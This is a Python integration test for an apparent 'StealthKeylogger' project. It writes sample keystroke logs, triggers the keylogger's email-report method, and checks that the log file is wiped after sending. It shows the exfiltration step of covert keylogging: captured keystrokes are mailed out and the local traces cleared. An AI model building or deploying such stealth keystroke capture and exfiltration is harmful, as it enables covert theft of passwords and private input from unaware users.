#!/usr/bin/env python3
"""
Keylogger Email Integration Test
===============================
Test the actual keylogger email method with proper setup
"""

import sys
import os
from pathlib import Path

# Add project root to path
project_root = Path(__file__).parent
sys.path.insert(0, str(project_root))

from src.core.keylogger import StealthKeylogger
import json

def test_keylogger_email():
    """Test keylogger email method with proper setup"""
    
    print("🧪 Testing Keylogger Email Integration")
    print("=" * 45)
    
    try:
        # Create logs directory if it doesn't exist
        os.makedirs('logs', exist_ok=True)
        
        # Initialize keylogger
        print("📧 Initializing keylogger...")
        keylogger = StealthKeylogger('examples/email_demo_config.json')
        
        # Create some test log data
        test_logs = f"""[2025-09-28 08:50:00] Educational Keylogger Test
[2025-09-28 08:50:01] h
[2025-09-28 08:50:02] e
[2025-09-28 08:50:03] l
[2025-09-28 08:50:04] l
[2025-09-28 08:50:05] o
[2025-09-28 08:50:06] [SPACE]
[2025-09-28 08:50:07] w
[2025-09-28 08:50:08] o
[2025-09-28 08:50:09] r
[2025-09-28 08:50:10] l
[2025-09-28 08:50:11] d
[2025-09-28 08:50:12] [ENTER]
[2025-09-28 08:50:13] This is a test of the email functionality
[2025-09-28 08:50:14] for educational purposes only
[2025-09-28 08:50:15] Email test completed successfully!
"""
        
        # Write test log file
        # First, let's check what log file path the keylogger is expecting
        with open('examples/email_demo_config.json', 'r') as f:
            config = json.load(f)
        
        # Handle both old and new config formats
        if 'storage' in config:
            log_file = config['storage']['log_file']
        else:
            log_file = config.get('log_file', 'logs/test_keylog.txt')
        
        print(f"📝 Creating test log file: {log_file}")
        
        # Ensure log directory exists
        os.makedirs(os.path.dirname(log_file), exist_ok=True)
        
        # Write test data
        with open(log_file, 'w', encoding='utf-8') as f:
            f.write(test_logs)
        
        print(f"✅ Test log created with {len(test_logs)} characters")
        
        # Update keylogger config to point to the correct log file
        if 'storage' in config:
            keylogger.config['log_file'] = config['storage']['log_file']
        else:
            keylogger.config['log_file'] = log_file
        
        # Send email
        print("📧 Sending email via keylogger...")
        
        # Manually call the email method and catch any errors
        try:
            result = keylogger.send_email_report()
            print("✅ Email method completed!")
            print("📬 Check your inbox for the keylogger report")
            print("📊 Report should contain the test keystrokes above")
            
        except Exception as e:
            print(f"❌ Error in email method: {e}")
            print(f"🔍 Error type: {type(e).__name__}")
            return False
        
        # Check if log file was cleared (indicates successful send)
        if os.path.exists(log_file):
            with open(log_file, 'r') as f:
                remaining_content = f.read()
                if not remaining_content.strip():
                    print("🗑️  Log file was cleared - indicates successful send!")
                else:
                    print("⚠️  Log file still has content - email may have failed")
        
        return True
        
    except Exception as e:
        print(f"❌ Setup error: {e}")
        print(f"🔍 Error type: {type(e).__name__}")
        return False

if __name__ == "__main__":
    test_keylogger_email()